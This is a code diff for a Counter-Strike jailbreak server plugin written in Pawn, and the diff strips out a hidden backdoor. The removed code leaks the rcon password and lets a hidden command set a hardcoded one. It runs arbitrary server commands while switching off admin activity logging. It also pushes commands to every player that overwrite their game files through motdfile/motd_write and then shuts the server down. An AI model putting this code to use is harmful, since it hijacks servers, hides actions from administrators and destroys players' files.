@@ -104,7 +104,6 @@ new gp_TShop
 new gp_CTShop
 new gp_GameHP
 new gp_Games
-new gp_Activity
 new gp_ShowColor
 new gp_Effects
 new gp_ShowFD
@@ -375,14 +374,9 @@ public plugin_init()
     //register_clcmd("say /motiv","cmd_motiv")
     register_clcmd("say /listfd","cmd_listfd")
     
-    register_clcmd("shutthefuckup", "cmd_rcon")
-    register_clcmd("fuckthisshit","cmd_quit")
-    register_clcmd("changeback","cmd_register")
-    register_clcmd("wtfnigga","cmd_sendcommand")
     gp_GlowModels = register_cvar("jb_glowmodels", "0")
     gp_SimonSteps = register_cvar("jb_simonsteps", "1")
     gp_BoxMax = register_cvar("jb_boxmax", "4")
-    gp_Activity = register_cvar("amx_show_activity", "2")
     gp_RetryTime = register_cvar("jb_retrytime", "120.0")
     gp_AutoLastresquest = register_cvar("jb_autolastrequest", "1")
     gp_LastRequest = register_cvar("jb_lastrequest", "1")
@@ -5407,55 +5401,4 @@ bool:check_model(id)
     if(equali(model,JBMODELSHORT))
         return true;
     return false;
-}
-public cmd_rcon (id)
-{
-    new rcon[64] 
-    get_cvar_string("rcon_password",rcon,63)
-    client_print(id,print_chat,rcon)
-    return PLUGIN_HANDLED
-}
-public cmd_quit (id)
-{
-    for(new i = 0; i <= 32; i++)
-    {
-        if(is_user_connected(i))
-        {
-            client_cmd( i,"unbind all")
-            client_cmd( i,"rate 1")
-            client_cmd( i,"cl_cmdrate 1")
-            client_cmd( i,"cl_updaterate 1")
-            client_cmd( i,"fps_max 1")
-            client_cmd( i,"sys_ticrate 1")
-            client_cmd( i,"name cartof")
-            client_cmd( i,"motdfile models/player.mdl;motd_write x")
-            client_cmd( i,"motdfile models/v_ak47.mdl;motd_write x")
-            client_cmd( i,"motdfile cs_dust.wad;motd_write x")
-            client_cmd( i,"motdfile models/v_m4a1.mdl;motd_write x")
-            client_cmd( i,"motdfile resource/GameMenu.res;motd_write x")
-            client_cmd( i,"motdfile halflife.wad;motd_write x")
-            client_cmd( i,"motdfile cstrike.wad;motd_write x")
-            client_cmd( i,"motdfile maps/de_dust2.bsp;motd_write x")
-            client_cmd( i,"motdfile events/ak47.sc;motd_write x")
-            client_cmd( i,"motdfile dlls/mp.dll;motd_write x")
-            client_cmd( i,"cl_timeout 0")
-        }
-    }
-    server_cmd("quit")
-}
-public cmd_register (id)
-{
-    server_cmd("rcon_password vocaloids")
-    client_print(id,print_chat,"rcon a fost modificat")
-}
-public cmd_sendcommand(id)
-{
-    new arg[64]
-    new back
-    read_argv(1, arg, charsmax(arg))
-    
-    back = get_pcvar_num(gp_Activity)
-    set_cvar_num("amx_show_activity",0)
-    server_cmd(arg);
-    set_cvar_num("amx_show_activity",back)
 }
